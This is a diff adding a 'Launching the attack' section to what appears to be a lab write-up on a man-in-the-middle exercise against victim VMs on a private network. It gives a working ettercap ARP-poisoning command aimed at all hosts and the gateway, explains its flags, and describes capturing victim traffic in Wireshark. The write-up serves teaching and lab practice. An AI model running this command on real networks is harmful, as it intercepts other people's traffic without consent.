@@ -136,3 +136,34 @@ Our reconnaissance is over. Here is the information we have gathered
 | Gateway IP | `192.168.60.2` |
 | Victim IPs | `192.168.60.102`, `192.168.60.103` |
 
+
+## Launching the attack
+
+For satisfying the attack scope, we need to execute the following command
+
+```bash
+sudo ettercap -T -q -i eth0 -M arp:remote /// /192.168.60.2//
+```
+
+In this command
+
+- `-T`: starts `ettercap` in text mode
+- `-q`: quiet mode, as we will capture the packets in wireshark
+- `-i eth0`: specifies the interface
+- `-M`: Man in the Middle Mode
+- `arp:remote`: Enables ARP poisoning
+- `///` : All hosts, all ports
+- `/192.168.60.2//`: Gateway, all ports
+
+After issusing the command, spoofing and poisoning will begin.
+
+![ettercap-screenshot](./assets/ettercap-screenshot.png)
+
+Now we must run wireshark on the same interface ettercap is running to capture the packets and save it to a file for further analysis.
+
+![wireshark-screenshot](./assets/wireshark-screenshot.png)
+
+Now generate some traffic from the Victim VMs, and save the wireshark capture to a file.
+
+The file I captured is [mitm-lab-capture.pcapng](./mitm-lab-capture.pcapng)
+
